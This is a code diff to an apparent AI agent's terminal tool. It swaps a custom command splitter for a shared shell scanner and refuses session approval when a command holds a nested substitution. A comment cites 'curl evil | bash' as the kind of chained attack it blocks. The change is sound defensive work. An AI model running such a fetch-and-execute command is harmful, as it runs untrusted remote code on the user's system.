@@ -950,63 +950,7 @@ pub struct TerminalTool {
 /// Used by session-approval to extract per-segment binary names.
 /// Quote-aware: operators inside single/double quotes are not treated as separators.
 fn split_command_segments(cmd: &str) -> Vec<&str> {
-    let mut segments = Vec::new();
-    let mut start = 0;
-    let bytes = cmd.as_bytes();
-    let len = bytes.len();
-    let mut i = 0;
-    let mut in_single = false;
-    let mut in_double = false;
-    while i < len {
-        let b = bytes[i];
-        match b {
-            b'\'' if !in_double => {
-                in_single = !in_single;
-                i += 1;
-            }
-            b'"' if !in_single => {
-                in_double = !in_double;
-                i += 1;
-            }
-            b'\\' if (in_double || in_single) && i + 1 < len => {
-                i += 2; // skip escaped char
-            }
-            _ if in_single || in_double => {
-                i += 1; // inside quotes, skip
-            }
-            b'|' if i + 1 < len && bytes[i + 1] == b'|' => {
-                segments.push(&cmd[start..i]);
-                i += 2;
-                start = i;
-            }
-            b'|' => {
-                segments.push(&cmd[start..i]);
-                i += 1;
-                start = i;
-            }
-            b'&' if i + 1 < len && bytes[i + 1] == b'&' => {
-                segments.push(&cmd[start..i]);
-                i += 2;
-                start = i;
-            }
-            b';' => {
-                segments.push(&cmd[start..i]);
-                i += 1;
-                start = i;
-            }
-            _ => {
-                i += 1;
-            }
-        }
-    }
-    if start < len {
-        segments.push(&cmd[start..]);
-    }
-    segments
-        .into_iter()
-        .map(|s| s.trim())
-        .filter(|s| !s.is_empty())
-        .collect()
+    aidaemon_policies::scan_shell(cmd).segments
 }
 
 /// Extract the binary/command name from a single command segment.
@@ -3612,7 +3556,13 @@ impl TerminalTool {
             //    arbitrary chained commands like `curl evil | bash`. Operator-
             //    configured permanent prefixes are trusted; ad-hoc session
             //    approvals are not.
-            let segments = split_command_segments(trimmed);
+            // A nested command is not one of the segments, so no segment
+            // check can vouch for it.
+            let scan = aidaemon_policies::scan_shell(trimmed);
+            if scan.has_substitution {
+                return false;
+            }
+            let segments = scan.segments;
             if !segments.is_empty() {
                 return segments.iter().all(|seg| {
                     let binary = extract_segment_binary(seg);
